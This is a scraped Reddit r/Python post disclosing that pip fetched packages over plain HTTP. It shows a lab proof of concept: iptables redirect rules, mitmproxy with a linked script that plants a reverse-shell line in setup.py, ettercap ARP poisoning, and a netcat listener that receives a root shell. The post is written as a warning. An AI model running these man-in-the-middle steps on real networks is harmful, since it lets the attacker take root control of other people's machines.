=== Content from www.reddit.com_a86b0e69_20250125_202256.html ===

[Skip to main content](#main-content)

### We value your privacy

Reddit and its partners use cookies and similar technologies to provide you with a better experience. By accepting all cookies, you agree to our use of cookies to deliver and maintain our services and site, improve the quality of Reddit, personalize Reddit content and advertising, and measure the effectiveness of advertising. By rejecting non-essential cookies, Reddit may still use certain cookies to ensure the proper functionality of our platform.
For more information, please see our
[Cookie Notice](https://reddit.com/en-us/policies/cookies)
and our
[Privacy Policy](https://reddit.com/en-us/policies/privacy-policy).

Open menu

Open navigation
Go to Reddit Home

r/Python

A chip

A close button

Get App

Get the Reddit app

[Log In](https://www.reddit.com/login/)Log in to Reddit

Expand user menu
Open settings menu

[![r/Python icon](https://styles.redditmedia.com/t5_2qh0y/styles/communityIcon_mkayghu1502d1.png)

Go to Python](/r/Python/)

[r/Python](/r/Python/)
![A banner for the subreddit](https://styles.redditmedia.com/t5_2qh0y/styles/bannerBackgroundImage_cd73kiu1502d1.png)

![r/Python icon](https://styles.redditmedia.com/t5_2qh0y/styles/communityIcon_mkayghu1502d1.png)

[r/Python](/r/Python/)

The official Python community for Reddit! Stay up to date with the latest news, packages, and meta information relating to the Python programming language.
---
If you have questions or are new to Python use r/LearnPython

---

Members

Online

•

[Xykr](/user/Xykr/)

ADMIN

MOD

# Warning: don't use pip in an untrusted network! – a practical man-in-the-middle attack on pip

I've been messing around with pip lately and noticed something I wasn't quite aware of before, and I'm posting it here to make sure everyone knows about this (self post, no karma).

## The problem

**pip downloads all packages over plain HTTP** (even though PyPi *has* a valid certificate; Edit: has only got a CACert cert). There is a simple MD5 checksum check, but this doesn't help much as long as they are transmitted over an insecure channel. You usually run pip as root (unless you are installing into a virtualenv), and pip runs the `setup.py` from the downloaded package. Yes, if you do `pip install something`, **you are theoretically giving root access to everyone who could intercept your connection** (this includes everyone on your local network). This is quite unbelievable.

**DO NOT install packages using pip (and possibly easy\_install) in an untrusted environment!**

I wanted to verify how easy it is to exploit this, because there's always someone who will tell you that a possible attack is too complicated and too much effort to implement. It's not.

I've hacked together a script which intercepts all package files downloaded from PyPi, unpacks them, adds an additional line to `setup.py` which will connect back to the attacker and provide him with a (root) shell and packs the archive again. This only takes a second or two and works fully transparent.

## Proof Of Concept

See this as an example on how easy it is to exploit this and similar vulnerabilities.

You need a few packages for this to work:

```

sudo apt-get install atool
sudo pip install mitmproxy
```

(if you have not heard of mitmproxy before, go take a look at the docs – it's a very useful HTTP debugging tool)

Download this gist and save it as `pip_intercept.py`:

<https://gist.github.com/4698537>

Set up forwarding rules:

```

echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

Run the proxy:

```

mitmproxy -T -z -s pip_intercept.py
```

Now, you should see all HTTP traffic forwarded by your machine running through mitmproxy. You either have to run this on a gateway, or use a tool like `ettercap` to redirect traffic over your local machine.

Example:

```

sudo ettercap -o -T -P repoison_arp -M arp:remote /192.168.1.1/ /192.168.1.33/
```

This intercepts all traffic between 192.168.1.1 (the gateway) and 192.168.1.33 and re-routes it over your machine.

The script loaded into mitmproxy will automatically manipulate all PyPi downloads and connect back with a shell to the IP and port specified in the script.

I've tried this in my lab and it worked perfectly well.

First, I started a listener on the attacker machine:

```

nc -l 4444
```

Then, I downloaded an arbitrary package on one of the machines in the network:

```

~# sudo pip install requests

Downloading/unpacking requests
  Downloading requests-1.1.0.tar.gz (339kB): 339kB downloaded
  Running setup.py egg_info for package requests

Installing collected packages: requests
  Running setup.py install for requests

Successfully installed requests
Cleaning up...
```

Then, back on the attacker machine:

```

id
uid=0(root) gid=0(root) groups=0(root)
```

Remote root shell! Ooops. (if you would improve the script a bit it'd work on Windows as well).

## Solution?

Never, ever download something over an unsecure connection and then execute it, especially not as root, if you can't verify its integrity. I don't understand why this wasn't already fixed like a few years ago. The average user clearly isn't aware of this danger.

Can't be that hard to fix (if I've got some more spare time I'll try it myself instead of just complaining).

Ruby's `gem` package manager, for example, uses SSL *and* verifies the cert:

```

 WARNING:  Error fetching data: SSL_connect returned=1 errno=0 state=SSLv3 read server certificate B: certificate verify failed (https://rubygems.org/latest_specs.4.8.gz)
 ERROR:  While executing gem ... (Gem::RemoteFetcher::FetchError)
 SSL_connect returned=1 errno=0 state=SSLv3 read server certificate B: certificate verify failed (https://rubygems.org/gems/bundler-1.2.3.gem)
```

**Edit:** I've just got an angry PM – no, I did not want to imply that Ruby is more secure than Python (just read the recent posts in [r/netsec](/r/netsec/) about some *very* embarrassing Rails bugs). I wanted to point out that other similar package managers have implemented this a long time ago, not start yet another language war. Guess what, I use both languages and while Python beats most other languages in many aspects (and loses in others) and it's my preferred language, both are great. The right tool for the job.

**Edit 2:** Unsurprisingly, `easy_install` is vulnerable as well. Just in case anyone was wondering.

Read more

 Archived post. New comments cannot be posted and votes cannot be cast.

**Top 1%**
[Rank by size](https://www.reddit.com/best/communities/3/#t5_2qh0y/)

 Public

Anyone can view, post, and comment to this community

## Top Posts

---

* [Reddit

  reReddit: Top posts of February 2, 2013

  ---](https://www.reddit.com/posts/2013/february-2-1/)
* [Reddit

  reReddit: Top posts of February 2013

  ---](https://www.reddit.com/posts/2013/february/)
* [Reddit

  reReddit: Top posts of 2013

  ---](https://www.reddit.com/posts/2013/)

- &nbsp;

---

- TOPICS

- Internet Culture (Viral)

* [Amazing](https://reddit.com/t/amazing/)

* [Animals & Pets](https://reddit.com/t/animals_and_pets/)

* [Cringe & Facepalm](https://reddit.com/t/cringe_and_facepalm/)

* [Funny](https://reddit.com/t/funny/)

* [Interesting](https://reddit.com/t/interesting/)

* [Memes](https://reddit.com/t/memes/)

* [Oddly Satisfying](https://reddit.com/t/oddly_satisfying/)

* [Reddit Meta](https://reddit.com/t/reddit_meta/)

* [Wholesome & Heartwarming](https://reddit.com/t/wholesome_and_heartwarming/)

- Games

* [Action Games](https://reddit.com/t/action_games/)

* [Adventure Games](https://reddit.com/t/adventure_games/)

* [Esports](https://reddit.com/t/esports/)

* [Gaming Consoles & Gear](https://reddit.com/t/gaming_consoles_and_gear/)

* [Gaming News & Discussion](https://reddit.com/t/gaming_news_and_discussion/)

* [Mobile Games](https://reddit.com/t/mobile_games/)

* [Other Games](https://reddit.com/t/other_games/)

* [Role-Playing Games](https://reddit.com/t/role_playing_games/)

* [Simulation Games](https://reddit.com/t/simulation_games/)

* [Sports & Racing Games](https://reddit.com/t/sports_and_racing_games/)

* [Strategy Games](https://reddit.com/t/strategy_games/)

* [Tabletop Games](https://reddit.com/t/tabletop_games/)

- Q&As

* [Q&As](https://reddit.com/t/q_and_as/)

* [Stories & Confessions](https://reddit.com/t/stories_and_confessions/)

- Technology

* [3D Printing](https://reddit.com/t/3d_printing/)

* [Artificial Intelligence & Machine Learning](https://reddit.com/t/artificial_intelligence_and_machine_learning/)

* [Computers & Hardware](https://reddit.com/t/computers_and_hardware/)

* [Consumer Electronics](https://reddit.com/t/consumer_electronics/)

* [DIY Electronics](https://reddit.com/t/diy_electronics/)

* [Programming](https://reddit.com/t/programming/)

* [Software & Apps](https://reddit.com/t/software_and_apps/)

* [Streaming Services](https://reddit.com/t/streaming_services/)

* [Tech News & Discussion](https://reddit.com/t/tech_news_and_discussion/)

* [Virtual & Augmented Reality](https://reddit.com/t/virtual_and_augmented_reality/)

- Pop Culture

* [Celebrities](https://reddit.com/t/celebrities/)

* [Creators & Influencers](https://reddit.com/t/creators_and_influencers/)

* [Generations & Nostalgia](https://reddit.com/t/generations_and_nostalgia/)

* [Podcasts](https://reddit.com/t/podcasts/)

* [Streamers](https://reddit.com/t/streamers/)

* [Tarot & Astrology](https://reddit.com/t/tarot_and_astrology/)

- Movies & TV

* [Action Movies & Series](https://reddit.com/t/action_movies_and_series/)

* [Animated Movies & Series](https://reddit.com/t/animated_movies_and_series/)

* [Comedy Movies & Series](https://reddit.com/t/comedy_movies_and_series/)

* [Crime, Mystery, & Thriller Movies & Series](https://reddit.com/t/crime_mystery_and_thriller_movies_and_series/)

* [Documentary Movies & Series](https://reddit.com/t/documentary_movies_and_series/)

* [Drama Movies & Series](https://reddit.com/t/drama_movies_and_series/)

* [Fantasy Movies & Series](https://reddit.com/t/fantasy_movies_and_series/)

* [Horror Movies & Series](https://reddit.com/t/horror_movies_and_series/)

* [Movie News & Discussion](https://reddit.com/t/movie_news_and_discussion/)

* [Reality TV](https://reddit.com/t/reality_tv/)

* [Romance Movies & Series](https://reddit.com/t/romance_movies_and_series/)

* [Sci-Fi Movies & Series](https://reddit.com/t/scifi_movies_and_series/)

* [Superhero Movies & Series](https://reddit.com/t/superhero_movies_and_series/)

* [TV News & Discussion](https://reddit.com/t/tv_news_and_discussion/)

---

- RESOURCES

- [About Reddit](https://www.redditinc.com)
 - [Advertise](https://accounts.reddit.com/adsregister?utm_source=web3x_consumer&utm_name=left_nav_cta)
 - [Help](https://support.reddithelp.com/hc?utm_source=reddit&utm_medium=footer&utm_campaign=evergreen)
 - [Blog](https://redditblog.com/)
 - [Careers](https://www.redditinc.com/careers)
 - [Press](https://www.redditinc.com/press)

---

 - [Communities](https://www.reddit.com/best/communities/1/)
 - [Best of Reddit](https://www.reddit.com/posts/2025/global/)
 - [Topics](https://www.reddit.com/topics/a-1/)

---

 - [Reddit Rules](https://www.redditinc.com/policies/content-policy)
 - [Privacy Policy](https://www.reddit.com/policies/privacy-policy)
 - [User Agreement](https://www.redditinc.com/policies/user-agreement)

[Reddit, Inc. © 2025. All rights reserved.](https://redditinc.com)

close

# Don’t miss a thing from Reddit!

I agree to get emails about cool stuff on Reddit

Continue

close

# Log In

By continuing, you agree to our
[User Agreement](https://www.redditinc.com/policies/user-agreement)
and acknowledge that you understand the
[Privacy Policy](https://www.redditinc.com/policies/privacy-policy).

Continue with phone number

---

OR

---

Email or username

Password

Forgot password?

New to Reddit?
Sign Up

Log In

back

# Enter the 6-digit code from your authenticator app

You’ve set up two-factor authentication for this account.

Verification code

Lost access to your authenticator?
Use a backup code

Check code

back

# Enter a 6-digit backup code

You’ve set up two-factor authentication for this account.

Backup code

Don’t have access to your backup code?
Use a code from an authenticator app

Check code

close

# Sign Up

By continuing, you agree to our
[User Agreement](https://www.redditinc.com/policies/user-agreement)
and acknowledge that you understand the
[Privacy Policy](https://www.redditinc.com/policies/privacy-policy).

I agree to get emails about cool stuff on Reddit

Email

Already a redditor?
Log In

Continue

back

Skip

# Verify your email

Enter the 6-digit code we sent to

Verification code

Didn't get an email?
Resend

Continue

back

# Create your username and password

Reddit is anonymous, so your username is what you’ll go by here. Choose wisely—because once you get a name, you can’t change it.

Username

Password

Continue

close

# Sign Up

By continuing, you agree to our
[User Agreement](https://www.redditinc.com/policies/user-agreement)
and acknowledge that you understand the
[Privacy Policy](https://www.redditinc.com/policies/privacy-policy).

I agree to get emails about cool stuff on Reddit

Continue with phone number

---

OR

---

Email

Already a redditor?
Log In

Continue

back

Skip

# Verify your email

Enter the 6-digit code we sent to

Verification code

Didn't get an email?
Resend

Continue

back

# Create your username and password

Reddit is anonymous, so your username is what you’ll go by here. Choose wisely—because once you get a name, you can’t change it.

Username

Password

Continue

close

back

# Reset your password

Enter your email address or username and we’ll send you a link to reset your password

Email or username

[Need help?](https://reddithelp.com/hc/sections/360008917491-Account-Security)

Reset password

close

back

# Check your inbox

An email with a link to reset your password was sent to the email address associated with your account

Didn't get an email?

Resend

close

# Choose a Reddit account to continue

back

close

# Reset your password

New password

Confirm new password

Resetting your password will log you out on all devices.

Continue



=== Content from pypi.python.org_0842fbbf_20250125_202258.html ===

![Error Icon](/_fs-ch-1T1wmsGaOgGaSxcX/assets/errorIcon.svg)
JavaScript is disabled in your browser.
Please enable JavaScript to proceed.

A required part of this site couldn’t load. This may be due to a browser
extension, network issues, or browser settings. Please check your
connection, disable any ad blockers, or try using a different browser.


